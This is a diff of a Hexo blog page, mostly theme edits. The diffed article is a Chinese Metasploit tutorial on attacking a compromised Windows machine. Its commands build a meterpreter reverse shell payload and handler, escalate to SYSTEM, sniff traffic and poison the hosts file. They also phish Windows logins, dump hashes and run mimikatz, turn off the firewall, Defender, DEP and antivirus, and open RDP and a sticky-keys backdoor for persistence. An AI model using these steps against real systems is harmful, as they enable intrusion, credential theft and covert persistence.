@@ -232,75 +232,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
         </li>
         
         
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
     </ul>
 </div>
 
 
         </div>
 
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
     </nav>
 
@@ -500,7 +437,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="系统防火墙原理及突破"><a href="#系统防火墙原理及突破" class="headerlink" title="系统防火墙原理及突破"></a>系统防火墙原理及突破</h1><h2 id="数据和嗅探："><a href="#数据和嗅探：" class="headerlink" title="数据和嗅探："></a>数据和嗅探：</h2><p>目标电脑上msf运行木马后</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe
 
 use exploit/muti/handler
 
@@ -513,12 +450,12 @@ set lhost 192.168.1.120
 exploit
 </code></pre>
 <p>提权</p>
-<pre><code>getuid
+<pre class=" language-Linux"><code class="language-Linux">getuid
 getsystem
 getuid
 </code></pre>
 <h3 id="对数据包的操作"><a href="#对数据包的操作" class="headerlink" title="对数据包的操作"></a>对数据包的操作</h3><p>进入session</p>
-<pre><code>load sniffer    # 加载嗅探模块
+<pre class=" language-Linux"><code class="language-Linux">load sniffer    # 加载嗅探模块
 
 sniffer_interfaces     # 查看电脑网卡
 
@@ -533,7 +470,7 @@ sniffer_stop 2    # 停止对2号网卡的嗅探
 <h2 id="host-注入——伪造域名"><a href="#host-注入——伪造域名" class="headerlink" title="host 注入——伪造域名"></a>host 注入——伪造域名</h2><p>msf</p>
 <p>提权到系统最高权限，</p>
 <p>然后进行如下操作：</p>
-<pre><code>use post/windows/manage/inject_host   # 使用注入模块
+<pre class=" language-Linux"><code class="language-Linux">use post/windows/manage/inject_host   # 使用注入模块
 
 show options
 
@@ -547,17 +484,17 @@ exploit
 </code></pre>
 <p>实质是修改了本机操控的木马所在电脑的host文件</p>
 <h2 id="用户认证钓鱼窗口"><a href="#用户认证钓鱼窗口" class="headerlink" title="用户认证钓鱼窗口"></a>用户认证钓鱼窗口</h2><p>进入sesion中</p>
-<pre><code>run post/windows/gather/phish_windows_credentials
+<pre class=" language-Linux"><code class="language-Linux">run post/windows/gather/phish_windows_credentials
 </code></pre>
 <p>这个时候管理员的桌面会出现认证窗口（假的）</p>
 <p>然后我们就可截获其用户名和密码。</p>
 <h2 id="passTheHash"><a href="#passTheHash" class="headerlink" title="passTheHash:"></a>passTheHash:</h2><p>必须是system权限<br>进入一个session</p>
-<pre><code>run post/windows/gather/hashdump    # 获得操作系统的用户hash值
+<pre class=" language-Linux"><code class="language-Linux">run post/windows/gather/hashdump    # 获得操作系统的用户hash值
 </code></pre>
 <p>即可以获取到管理员密码加密之后的密码，之后使用穷举的方法破解【使用彩虹表等】【或使用猕猴桃】</p>
 <h2 id="使用猕猴桃-32位-："><a href="#使用猕猴桃-32位-：" class="headerlink" title="使用猕猴桃(32位)："></a>使用猕猴桃(32位)：</h2><p>实质利用lsass.exe本地安全认证进程，达到获得用户登录密码。</p>
 <p>连接木马：</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe
 
 use exploit/multi/handler
 
@@ -574,7 +511,7 @@ getsystem
 getuid
 </code></pre>
 <p>进入session加载猕猴桃：</p>
-<pre><code>load mimikatz(或load kiwi)   # 加载猕猴桃
+<pre class=" language-Linux"><code class="language-Linux">load mimikatz(或load kiwi)   # 加载猕猴桃
 
 help kiwi   # 查看猕猴桃的命令
 
@@ -586,29 +523,29 @@ creds_msv     # 只列出当前用户加密之后的密码
 </code></pre>
 <p><strong>电脑版本的猕猴桃软件</strong>：通过获取内存内容得到答案</p>
 <p>扫雷外挂（Windows2003，Windows7）:</p>
-<pre><code>winmine::infos
+<pre class=" language-Linux"><code class="language-Linux">winmine::infos
 </code></pre>
 <h2 id="防火墙和3389端口："><a href="#防火墙和3389端口：" class="headerlink" title="防火墙和3389端口："></a>防火墙和3389端口：</h2><h3 id="正常打开-x2F-关闭防火墙："><a href="#正常打开-x2F-关闭防火墙：" class="headerlink" title="正常打开&#x2F;关闭防火墙："></a>正常打开&#x2F;关闭防火墙：</h3><p><img src="/2022/03/23/fire-wall/image-20220110182306171.png" alt="image-20220110182306171"></p>
 <h3 id="命令行打开-x2F-关闭防火墙"><a href="#命令行打开-x2F-关闭防火墙" class="headerlink" title="命令行打开&#x2F;关闭防火墙"></a>命令行打开&#x2F;关闭防火墙</h3><p>kali操纵木马对windows进行操作</p>
-<pre><code>shell   #进入到命令行到C:\Windows\system32目录下
+<pre class=" language-Linux"><code class="language-Linux">shell   #进入到命令行到C:\Windows\system32目录下
 </code></pre>
-<pre><code>whoami   #查看是否为系统权限
+<pre class=" language-Linux"><code class="language-Linux">whoami   #查看是否为系统权限
 </code></pre>
 <p><strong>关闭防火墙</strong></p>
-<pre><code>netsh advfirewall set allprofiles state off
+<pre class=" language-Linux"><code class="language-Linux">netsh advfirewall set allprofiles state off
 </code></pre>
 <p><strong>关闭defener</strong></p>
-<pre><code>net stop windefend
+<pre class=" language-Linux"><code class="language-Linux">net stop windefend
 </code></pre>
 <p><strong>关闭dep(数据执行保护)</strong></p>
-<pre><code>bcdedit.exe /set &#123;current&#125; nx AlwaysOff
+<pre class=" language-Linux"><code class="language-Linux">bcdedit.exe /set &#123;current&#125; nx AlwaysOff
 </code></pre>
 <p><strong>退出命令行返回到msf里</strong>：</p>
-<pre><code>exit
+<pre class=" language-Linux"><code class="language-Linux">exit
 </code></pre>
 <p>回到meterpreter的木马里</p>
 <p><strong>关闭杀毒软件</strong></p>
-<pre><code>run killav
+<pre class=" language-Linux"><code class="language-Linux">run killav
 
 (run post/windows/manage/killav)
 </code></pre>
@@ -616,11 +553,11 @@ creds_msv     # 只列出当前用户加密之后的密码
 <h3 id="关于远程连接——在木马被杀掉后能有后门进行连接"><a href="#关于远程连接——在木马被杀掉后能有后门进行连接" class="headerlink" title="关于远程连接——在木马被杀掉后能有后门进行连接"></a>关于远程连接——在木马被杀掉后能有后门进行连接</h3><p>一般情况：</p>
 <p>在我的电脑右键属性里可以设置</p>
 <p>可以看到目标主机上cmd后</p>
-<pre><code>netstat -ano    # 查看端口状态
+<pre class=" language-Linux"><code class="language-Linux">netstat -ano    # 查看端口状态
 # 会发现3389端口未打开
 </code></pre>
 <p><strong>开启远程桌面(3389)</strong></p>
-<pre><code>run post/windows/manage/enable_rdp   # 开启远程桌面
+<pre class=" language-Linux"><code class="language-Linux">run post/windows/manage/enable_rdp   # 开启远程桌面
 
 run getgui -e    # 开启远程桌面（不太靠谱）
 
@@ -631,11 +568,11 @@ run getgui -e -f 8888    # 开启远程桌面并且绑定在8888端口上
 <p>指定端口：</p>
 <p><img src="/2022/03/23/fire-wall/image-20220110183822328.png" alt="image-20220110183822328"></p>
 <p><strong>kali图形界面上使用远程桌面</strong></p>
-<pre><code>rdesktop -u [用户名] -p [密码] [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">rdesktop -u [用户名] -p [密码] [目标ip]
 </code></pre>
 <p><strong>关于截图</strong>：</p>
 <p>msf</p>
-<pre><code>load espia  # 加载截图插件
+<pre class=" language-Linux"><code class="language-Linux">load espia  # 加载截图插件
 
 screengrab   # 截图
 </code></pre>
@@ -646,13 +583,13 @@ screengrab   # 截图
 <ol>
 <li><p>卸载对方的补丁</p>
 </li>
-<li><p>给对方安装一些有漏洞的软件（比如说ftp程序，输入法等等）【蓝奏云里的：小ftp，然后打开浏览器访问即可打开文件夹】</p>
+<li><p>给对方安装一些有漏洞的软件（比如说ftp程序，输入法等等）然后打开浏览器访问即可打开文件夹</p>
 <p>考虑粘滞键漏洞：</p>
-<pre><code>粘滞键地址在c:\windows\system32\sethc
+<pre class=" language-Linux"><code class="language-Linux">粘滞键地址在c:\windows\system32\sethc
 </code></pre>
 <p>按5下shift键，即可召唤出来。</p>
 <p>桌面新建一个x.bat</p>
-<pre><code>takeown /f c:\windows\system32\sethc.* /a /r /d y  
+<pre class=" language-Linux"><code class="language-Linux">takeown /f c:\windows\system32\sethc.* /a /r /d y  
 # 获得其控制权
 cacls c:\windows\system32\sethc.exe /T /E /G system:F  
 # 修改控制权
@@ -1417,16 +1354,20 @@ $(function () {
     
 
     <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
     
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
 
+	
     <!-- 鼠标星星特效 -->
     
 
